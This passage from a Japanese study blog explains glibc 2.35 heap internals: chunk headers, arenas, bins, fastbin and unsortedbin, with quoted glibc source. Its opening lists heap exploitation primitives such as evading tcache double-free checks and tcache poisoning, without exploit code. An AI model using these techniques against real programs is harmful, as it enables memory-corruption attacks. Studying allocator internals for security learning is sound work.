Double Freeは通常tcacheがエントリのkeyによって検出するため、UAFなどを利用してkeyを書き換えることでDouble Freeのチェックを回避することができる</li>
<li>
<p>tcacheの改ざん/mp<em>.tcache</em>binsの改ざん</p>
<p>任意のアドレスからメモリ確保が可能になる</p>
</li>
<li>fastbin/smallbin/largebinの汚染</li>
<li>チャンクヘッダのsizeの改ざん
チャンクサイズを拡大することで他のチャンクを絞り込むことができる</li>
<li>topサイズの縮小</li>
</ul>
<h2 id="glibcのソースコードを手に入れる" style="position:relative;"><a href="#glibc%E3%81%AE%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E6%89%8B%E3%81%AB%E5%85%A5%E3%82%8C%E3%82%8B" aria-label="glibcのソースコードを手に入れる permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>glibcのソースコードを手に入れる</h2>
<p>とりあえず以下から<code class="language-text">glibc</code>のソースコードを入手しました。</p>
<p>本家のリポジトリをミラーしてくれているリポジトリらしいです。</p>
<p>参考：<a href="https://github.com/bminor/glibc" target="_blank" rel="nofollow noopener noreferrer">GitHub - bminor/glibc: Unofficial mirror of sourceware glibc repository. Updated daily.</a></p>
<p>今回glibを読む際は、基本的に<code class="language-text">glibc-2.35</code>を読んでいくことにします。</p>
<h2 id="チャンク" style="position:relative;"><a href="#%E3%83%81%E3%83%A3%E3%83%B3%E3%82%AF" aria-label="チャンク permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>チャンク</h2>
<p>Heapは、メモリをチャンクという単位で管理します。</p>
<p>チャンクはx86<em>64では0x10バイト単位でアラインメントされます。(size</em>t型の2倍)</p>
<p>また、1つのチャンクの最小サイズは0x20バイトがMINISIZEとして定義されています。</p>
<p>このチャンクのチャンクヘッダは以下の構造体で定義されていました。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a "view" into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/</span>

<span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span> <span class="token punctuation">{</span>

  INTERNAL_SIZE_T      mchunk_prev_size<span class="token punctuation">;</span>  <span class="token comment">/* Size of previous chunk (if free).  */</span>
  INTERNAL_SIZE_T      mchunk_size<span class="token punctuation">;</span>       <span class="token comment">/* Size in bytes, including overhead. */</span>

  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd<span class="token punctuation">;</span>         <span class="token comment">/* double links -- used only if free. */</span>
  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk<span class="token punctuation">;</span>

  <span class="token comment">/* Only used for large blocks: pointer to next larger size.  */</span>
  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment">/* double links -- used only if free. */</span>
  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></div>
<p>チャンクの構造については以下のリンク先の図がわかりやすかったです。</p>
<p><code class="language-text">Size of chunk</code>の下位3bitにはAMPが順に割り当てられていますが、それぞれ以下の意味を持っています。</p>
<ul>
<li>A：NON<em>MAIN＿ARENA   main</em>arenaではない別のアリーナで管理されている場合にセットされている</li>
<li>M：IS_MMAPPED   ヒープ領域ではなく、mmapで確保された領域上にある場合にセットされる</li>
<li>P：PREV<em>INUSE   prev</em>chunkが利用中にセットされる</li>
</ul>
<p>参考情報：<a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_chunk" target="_blank" rel="nofollow noopener noreferrer">malloc_chunk - heap-exploitation</a></p>
<h3 id="allocated-chunk" style="position:relative;"><a href="#allocated-chunk" aria-label="allocated chunk permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Allocated chunk</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">    chunk-<span class="token operator">></span> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            <span class="token operator">|</span>             Size of previous chunk, <span class="token keyword">if</span> unallocated <span class="token punctuation">(</span>P <span class="token function">clear</span><span class="token punctuation">)</span>  <span class="token operator">|</span>
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            <span class="token operator">|</span>             Size of chunk, <span class="token keyword">in</span> bytes                     <span class="token operator">|</span>A<span class="token operator">|</span>M<span class="token operator">|</span>P<span class="token operator">|</span>
      mem-<span class="token operator">></span> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            <span class="token operator">|</span>             User data starts here<span class="token punctuation">..</span>.                          <span class="token builtin class-name">.</span>
            <span class="token builtin class-name">.</span>                                                               <span class="token builtin class-name">.</span>
            <span class="token builtin class-name">.</span>             <span class="token punctuation">(</span>malloc_usable_size<span class="token punctuation">(</span><span class="token punctuation">)</span> bytes<span class="token punctuation">)</span>                      <span class="token builtin class-name">.</span>
            <span class="token builtin class-name">.</span>                                                               <span class="token operator">|</span>
nextchunk-<span class="token operator">></span> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            <span class="token operator">|</span>             <span class="token punctuation">(</span>size of chunk, but used <span class="token keyword">for</span> application data<span class="token punctuation">)</span>    <span class="token operator">|</span>
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            <span class="token operator">|</span>             Size of next chunk, <span class="token keyword">in</span> bytes                <span class="token operator">|</span>A<span class="token operator">|</span><span class="token number">0</span><span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span>
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre></div>
<p>割り当て済みのチャンクの構造を見ると、チャンクサイズ以降にデータが格納されています。</p>
<p>場合によっては、次のチャンクの<code class="language-text">Size of previous chunk</code>の領域もデータに使用するようです。</p>
<h3 id="free-chunk" style="position:relative;"><a href="#free-chunk" aria-label="free chunk permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Free chunk</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">    chunk-<span class="token operator">></span> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            <span class="token operator">|</span>             Size of previous chunk, <span class="token keyword">if</span> unallocated <span class="token punctuation">(</span>P <span class="token function">clear</span><span class="token punctuation">)</span>  <span class="token operator">|</span>
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    <span class="token variable"><span class="token variable">`</span>head:' <span class="token operator">|</span>             Size of chunk, <span class="token keyword">in</span> bytes                     <span class="token operator">|</span>A<span class="token operator">|</span><span class="token number">0</span><span class="token operator">|</span>P<span class="token operator">|</span>
      mem-<span class="token operator">></span> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            <span class="token operator">|</span>             Forward pointer to next chunk <span class="token keyword">in</span> list             <span class="token operator">|</span>
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            <span class="token operator">|</span>             Back pointer to previous chunk <span class="token keyword">in</span> list            <span class="token operator">|</span>
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            <span class="token operator">|</span>             Unused space <span class="token punctuation">(</span>may be <span class="token number">0</span> bytes long<span class="token punctuation">)</span>                <span class="token builtin class-name">.</span>
            <span class="token builtin class-name">.</span>                                                               <span class="token builtin class-name">.</span>
            <span class="token builtin class-name">.</span>                                                               <span class="token operator">|</span>
nextchunk-<span class="token operator">></span> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    <span class="token variable">`</span></span>foot:' <span class="token operator">|</span>             Size of chunk, <span class="token keyword">in</span> bytes                           <span class="token operator">|</span>
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            <span class="token operator">|</span>             Size of next chunk, <span class="token keyword">in</span> bytes                <span class="token operator">|</span>A<span class="token operator">|</span><span class="token number">0</span><span class="token operator">|</span><span class="token number">0</span><span class="token operator">|</span>
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre></div>
<p>解放済みチャンクには、<code class="language-text">Forward pointer to next chunk in list</code>と<code class="language-text">Back pointer to previous chunk in list</code>の値が追加されます。</p>
<p>それぞれ、<code class="language-text">fd_nextsize</code>と<code class="language-text">bk_nextsize</code>として定義されています。</p>
<h2 id="アリーナ" style="position:relative;"><a href="#%E3%82%A2%E3%83%AA%E3%83%BC%E3%83%8A" aria-label="アリーナ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>アリーナ</h2>
<p>Heapのメモリプールを管理する機構をアリーナと呼びます。</p>
<p>アリーナは以下の<code class="language-text">malloc_state</code>構造体で定義されます。</p>
<p>メインスレッドのアリーナはグローバル変数として定義されており、ヒープセグメントには含まれません。</p>
<p>このメインスレッドのアリーナは<code class="language-text">main_arena</code>という名前で存在します。</p>
<p>アリーナに関するいくつかの項目についての説明を以下に記載します。</p>
<ul>
<li>fastbinsY：fastbinをサイズ別に管理する単方向の線形リストの配列</li>
<li>top：メモリプールの未使用領域の先頭を指す</li>
<li>last_reminder：既存の解放済みチャンクを分割した際利用されなかった残りのチャンク1つを保持</li>
<li>bins：unsortedbin、smallbin、laregebinを管理する双方向循環リストの配列</li>
<li>binmap：チャンクがつながっているbinsのインデックスに対応するフラグが立つマップ</li>
<li>system_mem：システムから確保したメモリプールの総量</li>
</ul>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/*
   have_fastchunks indicates that there are probably some fastbin chunks.
   It is set true on entering a chunk into any fastbin, and cleared early in
   malloc_consolidate.  The value is approximate since it may be set when there
   are no fastbin chunks, or it may be clear even if there are fastbin chunks
   available.  Given it's sole purpose is to reduce number of redundant calls to
   malloc_consolidate, it does not affect correctness.  As a result we can safely
   use relaxed atomic accesses.
 */</span>

<span class="token keyword">struct</span> <span class="token class-name">malloc_state</span>
<span class="token punctuation">{</span>
  <span class="token comment">/* Serialize access.  */</span>
  <span class="token function">__libc_lock_define</span> <span class="token punctuation">(</span><span class="token punctuation">,</span> mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/* Flags (formerly in max_fast).  */</span>
  <span class="token keyword">int</span> flags<span class="token punctuation">;</span>

  <span class="token comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span>
  <span class="token comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span>
  <span class="token keyword">int</span> have_fastchunks<span class="token punctuation">;</span>

  <span class="token comment">/* Fastbins */</span>
  mfastbinptr fastbinsY<span class="token punctuation">[</span>NFASTBINS<span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>
  mchunkptr top<span class="token punctuation">;</span>

  <span class="token comment">/* The remainder from the most recent split of a small request */</span>
  mchunkptr last_remainder<span class="token punctuation">;</span>

  <span class="token comment">/* Normal bins packed as described above */</span>
  mchunkptr bins<span class="token punctuation">[</span>NBINS <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">/* Bitmap of bins */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> binmap<span class="token punctuation">[</span>BINMAPSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">/* Linked list */</span>
  <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>

  <span class="token comment">/* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */</span>
  <span class="token keyword">struct</span> <span class="token class-name">malloc_state</span> <span class="token operator">*</span>next_free<span class="token punctuation">;</span>

  <span class="token comment">/* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */</span>
  INTERNAL_SIZE_T attached_threads<span class="token punctuation">;</span>

  <span class="token comment">/* Memory allocated from the system in this arena.  */</span>
  INTERNAL_SIZE_T system_mem<span class="token punctuation">;</span>
  INTERNAL_SIZE_T max_system_mem<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></div>
<p>アリーナ内のbinsについては、「unsortedbin、smallbin、laregebinを管理する双方向循環リストの配列」と記載しました。</p>
<p>binsとは、解法されている(non-allocated)チャンクのリストです。</p>
<p>binsはチャンクのサイズなどによって以下のいずれかが選択されます。</p>
<ol>
<li>Fast bin</li>
<li>Unsorted bin</li>
<li>Small bin</li>
<li>Large bin</li>
</ol>
<p>ここで、binsはbins[2n]とbins[2n+1]の2つで1セットとして管理されます。</p>
<p>これはそれぞれリスト構造のfdとbkの役割を果たしています。</p>
<p>smallbinやlargebinのインデックスからチャンクヘッダーのアドレスを計算するためには以下の<code class="language-text">bin_at</code>マクロが使用されます(bin_atのインデックスは1から始まります)。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> mchunkptr<span class="token punctuation">;</span>
mchunkptr bins<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// Array of pointers to chunks</span>

<span class="token comment">/* addressing -- note that bin_at(0) does not exist */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">bin_at</span><span class="token expression"><span class="token punctuation">(</span>m<span class="token punctuation">,</span> i<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token punctuation">(</span>mbinptr<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">-></span>bins<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>			      </span><span class="token punctuation">\</span>
             <span class="token expression"><span class="token operator">-</span> <span class="token function">offsetof</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></code></pre></div>
<p>binsでは解法されている(non-allocated)チャンクをfdとbkを利用して双方向循環リストとして管理しています。</p>
<h2 id="fastbin" style="position:relative;"><a href="#fastbin" aria-label="fastbin permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>fastbin</h2>
<p>小さいサイズのチャンクは確保や解放が頻繁に行われる傾向にあるため、チャンクの繋ぎ替えの手間のかかる双方向リストではなく、単方向リストで管理可能な仕組みが用意されています。</p>
<p>glibc-2.3から導入されたこのような機構をfastbinと呼びます。</p>
<p>fastbinは前述した<code class="language-text">malloc_state</code>の<code class="language-text">fastbinsY</code>で管理されます。</p>
<p>ちなみにここで指定されている<code class="language-text">mfastbinptr</code>は、<code class="language-text">malloc_chunk</code>構造体のポインタとして定義されているようです。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">DEFAULT_MXFAST</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEFAULT_MXFAST</span>     <span class="token expression"><span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

<span class="token comment">/* The maximum fastbin request size we support */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_FAST_SIZE</span>     <span class="token expression"><span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NFASTBINS</span>  <span class="token expression"><span class="token punctuation">(</span><span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">request2size</span> <span class="token punctuation">(</span>MAX_FAST_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span></span></span>

<span class="token comment">/* Maximum size of memory handled in fastbins.  */</span>
<span class="token keyword">static</span> INTERNAL_SIZE_T global_max_fast<span class="token punctuation">;</span>

<span class="token comment">/*
   Set value of max_fast.
   Use impossibly small value if 0.
   Precondition: there are no existing fastbin chunks in the main arena.
   Since do_check_malloc_state () checks this, we call malloc_consolidate ()
   before changing max_fast.  Note other arenas will leak their fast bin
   entries if max_fast is reduced.
 */</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">set_max_fast</span><span class="token expression"><span class="token punctuation">(</span>s<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
  <span class="token expression">global_max_fast <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> MALLOC_ALIGN_MASK <span class="token operator">-</span> SIZE_SZ<span class="token punctuation">)</span>	</span><span class="token punctuation">\</span>
                     <span class="token expression"><span class="token operator">?</span> MIN_CHUNK_SIZE <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">+</span> SIZE_SZ<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span>MALLOC_ALIGN_MASK<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span> <span class="token operator">*</span>mfastbinptr<span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">malloc_state</span>
<span class="token punctuation">{</span>
  <span class="token comment">/* Fastbins */</span>
  mfastbinptr fastbinsY<span class="token punctuation">[</span>NFASTBINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></div>
<p><code class="language-text">fastbinsY</code>は最大で0xb0バイトのチャンクまでを管理することが可能ですが、実際には<code class="language-text">global_max_fast</code>マクロによって定義された0x80がセットされるようです。</p>
<p><code class="language-text">fastbinsY</code>は10個の要素を持つ配列であり、<code class="language-text">fastbinsY[0]</code>が最小サイズの0x20バイト、以降は0x30、0x40…と、0x10ごとに管理される形になります。</p>
<p>そのため、0x80が既定の最大値であることから、<code class="language-text">fastbinsY</code>の要素は一般に0から6までしか使用されません。</p>
<p>fastbinで管理されるチャンクの場合は、<code class="language-text">Size of next chunk, in bytes</code>の下位バイトにセットされる「P：PREV_INUSE」がセットされたままになります。</p>
<p>つまり、このチャンクは利用されている状態と認識されます。</p>
<p>Pwngdbを使うと、以下のようにfastbinの状態を確認することができます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/cac8d0ea8ee03084a391103a8b20c4cd/c6ff8/image-20220710110807096.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA6ElEQVQY04WQW26EMAxFsxsoAZJAXo5JQmAYBkGrfnT/a2nUeWg6/ah0ZB1ZtnVlYjWCT9OxScQGVoZb0zmDM8aV9ajd9JBhvGRRkCgzBe3LWpJaGqZN2JOdPI+fVGBZ91WrM2+NepG8cK1XCJNWGBf3GabAwnvFofy5WtzrizxDmLLCwnic4BR5+Ki4Le9Dxe/Rv5BW2tZYv48mDTl21fkcu6CStooy/c9yzaDrRoQt2kPOXyYdFpwfUGnQBm4RHlmeJEOYsM6kxR/TcI7TIszAceU6cokQzp0O+cPOL72JWTDeOlmE8t8k4VVZRW5i3wAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/cac8d0ea8ee03084a391103a8b20c4cd/8ac56/image-20220710110807096.webp 240w,
/static/cac8d0ea8ee03084a391103a8b20c4cd/d3be9/image-20220710110807096.webp 480w,
/static/cac8d0ea8ee03084a391103a8b20c4cd/e46b2/image-20220710110807096.webp 960w,
/static/cac8d0ea8ee03084a391103a8b20c4cd/a9e21/image-20220710110807096.webp 1088w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/cac8d0ea8ee03084a391103a8b20c4cd/8ff5a/image-20220710110807096.png 240w,
/static/cac8d0ea8ee03084a391103a8b20c4cd/e85cb/image-20220710110807096.png 480w,
/static/cac8d0ea8ee03084a391103a8b20c4cd/d9199/image-20220710110807096.png 960w,
/static/cac8d0ea8ee03084a391103a8b20c4cd/c6ff8/image-20220710110807096.png 1088w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/cac8d0ea8ee03084a391103a8b20c4cd/d9199/image-20220710110807096.png"
            alt="image-20220710110807096"
            title="image-20220710110807096"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h2 id="unsortedbin" style="position:relative;"><a href="#unsortedbin" aria-label="unsortedbin permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>unsortedbin</h2>
<p>解放されたチャンクはsmallbinやlargebinに選り分けられますが、その前の一時的な管理のためにunsortedbinが利用されます。(unsorted_chunksは基本的にキューとして動作します)</p>
<p>ここで、ソートされていないチャンクにはNON<em>MAIN</em>ARENA のフラグはセットされません。</p>
<p>unsorted<em>chunksは以下のマクロで定義されており、`bin</em>at(1) つまり bins[0]とbins[1]`が定義されます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/*
   Unsorted chunks

    All remainders from chunk splits, as well as all returned chunks,
    are first placed in the "unsorted" bin. They are then placed
    in regular bins after malloc gives them ONE chance to be used before
    binning. So, basically, the unsorted_chunks list acts as a queue,
    with chunks being placed on it in free (and malloc_consolidate),
    and taken off (to be either used or placed in bins) in malloc.

    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it
    does not have to be taken into account in size comparisons.
 */</span>

<span class="token comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unsorted_chunks</span><span class="token expression"><span class="token punctuation">(</span>M<span class="token punctuation">)</span>          <span class="token punctuation">(</span><span class="token function">bin_at</span> <span class="token punctuation">(</span>M<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></code></pre></div>
